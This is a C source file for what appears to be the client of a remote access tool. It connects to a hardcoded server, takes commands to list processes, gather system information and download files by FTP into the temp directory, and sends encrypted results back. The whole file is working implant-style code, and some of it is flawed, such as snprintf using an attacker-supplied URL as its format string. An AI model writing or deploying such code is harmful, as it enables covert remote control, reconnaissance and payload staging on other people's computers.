#include <winsock2.h>
#include <windows.h>

#include "../utils/config.h"
#include "../utils/socket.h"
#include "../utils/userIO.h"
#include "../utils/command.h"
#include "../utils/encryption.h"
#include "../utils/logging.h"
#include "../utils/processes.h"
#include "../utils/information.h"
#include "../utils/ftp.h"

#define FTP_ERR_FMT "[!][%i] Could not download %s"

void downloadFile(char buffer[BUF_SIZE], char *URL);
void uploadFile(char buffer[BUF_SIZE], char *URL);

typedef void (*commandFunction)(char buffer[BUF_SIZE], char *URL);

typedef struct
{
    char *commandName;
    commandFunction action;
} commandAction;

commandAction commandMapping[] = {
    {"PROCESSES", &getProcesses},
    {"INFORMATION", &getInformation},
    {"UPLOAD", &uploadFile},
    {"DOWNLOAD", &downloadFile},
};

int initializeClientSocket(SOCKET *clientSocket, const char *serverIp, int serverPort)
{
    struct sockaddr_in serverDetails;

    // Fill in server address information
    serverDetails.sin_family = AF_INET;
    serverDetails.sin_addr.s_addr = inet_addr(serverIp);
    serverDetails.sin_port = htons(serverPort);

    // Connect to server
    if (connect(*clientSocket, (struct sockaddr *)&serverDetails, sizeof(serverDetails)) < 0)
    {
        closesocket(*clientSocket);
        return 1;
    }
    return 0;
}

void uploadFile(char buffer[BUF_SIZE], char *URL)
{
    snprintf(buffer, BUF_SIZE, URL);
}

void downloadFile(char buffer[BUF_SIZE], char *URL)
{
    char filePath[BUF_SIZE];
    DWORD pathLen;
    if (!(getTempDir(filePath, &pathLen)))
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 1, URL);
    }
    snprintf(filePath + strlen(filePath), BUF_SIZE - strlen(filePath), getBasename(URL));
    HINTERNET ftpHandle = createFtpHandle(FTP_SERVER, FTP_USER, FTP_PASS);
    if (!ftpHandle)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, 2, URL);
    }
    int result = downloadFileFtp(&ftpHandle, URL, filePath);
    if (result != 0)
    {
        snprintf(buffer, BUF_SIZE, FTP_ERR_FMT, result + 2, URL);
    }
    snprintf(buffer, BUF_SIZE, "[i] Successfully downloaded file into %s", filePath);
}

int fetchData(SOCKET *socket, char buffer[BUF_SIZE])
{
    return recv(*socket, buffer, BUF_SIZE, 0x0);
}

char *commandHandler(char *commandName, char *URL)
{
    static char buffer[BUF_SIZE];
    for (int i = 0; i < NUM_COMMANDS - 1; i++)
    {
        if (strcmp(commandName, commandMapping[i].commandName) == 0)
        {
            commandMapping[i].action(buffer, URL);
            return buffer;
        }
    }
    return NULL;
}

int sendResponse(SOCKET *socket, COMMAND commandCode, char *buffer, int bufLen)
{
    char message[BUF_SIZE];
    snprintf(message, BUF_SIZE, PREAMBLE_FMT, commandCode, bufLen);
    if (send(*socket, message, BUF_SIZE, 0x0) == SOCKET_ERROR)
    {
        return SOCKET_ERROR;
    }
    return send(*socket, buffer, bufLen, 0x0);
}

void serverHandler(SOCKET socket)
{
    COMMAND command;
    char buffer[BUF_SIZE], URL[BUF_SIZE], time[TIME_BUF_SIZ];
    int bytesReceived, expectedBuffer;
    while (TRUE)
    {
        bytesReceived = fetchData(&socket, buffer);
        if (bytesReceived == SOCKET_ERROR || !bytesReceived)
        {
            break;
        }
        buffer[bytesReceived] = '\0';
        parseCommand(buffer, &command, &expectedBuffer, NULL, FALSE);
        char *commandName = decodeCommand(command);
        if (expectedBuffer > 0)
        {
            bytesReceived = fetchData(&socket, buffer);
            if (bytesReceived == SOCKET_ERROR || !bytesReceived)
            {
                break;
            }
            buffer[bytesReceived] = '\0';
            parseCommand(buffer, &command, &expectedBuffer, URL, TRUE);
            printf("[%s] Received %s [%s]\n", getCurrTime(), commandName, URL);
        }
        else
        {
            printf("[%s] Received %s\n", getCurrTime(), commandName);
            URL[0] = '\0';
        }

        if (strcmp(commandName, QUIT) == 0)
        {
            exit(0);
        }
        char *result = commandHandler(commandName, URL);
        if (result == NULL)
        {
            getCurrTime(time);
            printf("[%s] Handle Error: %s", getCurrTime(), commandName);
        }
        strip(result);
        int bufLen = strlen(result);
        encrypt(command, result, bufLen, bufLen);
        sendResponse(&socket, command, result, bufLen);
    }
    closesocket(socket);
    return;
}

int main(void)
{
    printf("[i] Initializing Client\n");
    // char serverIp[BUF_SIZE], serverPort[BUF_SIZE];
    // getInput("[?] Server IP Address: ", serverIp);
    // getInput("[?] Server Port: ", serverPort);
    // int port = strtol(serverPort, NULL, 0xA);

    // strip(serverIp);
    char *serverIp = HOST;
    int serverPort = PORT;
    SOCKET clientSocket = createSocket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET)
    {
        exit(10);
    }
    int error_code = initializeClientSocket(&clientSocket, serverIp, serverPort);

    if (error_code)
    {
        printf("[E] Could not connect to %s on port %i\n", serverIp, serverPort);
        printf("[i] Exiting...\n");
    }
    serverHandler(clientSocket);

    WSACleanup();
    return 0;
}
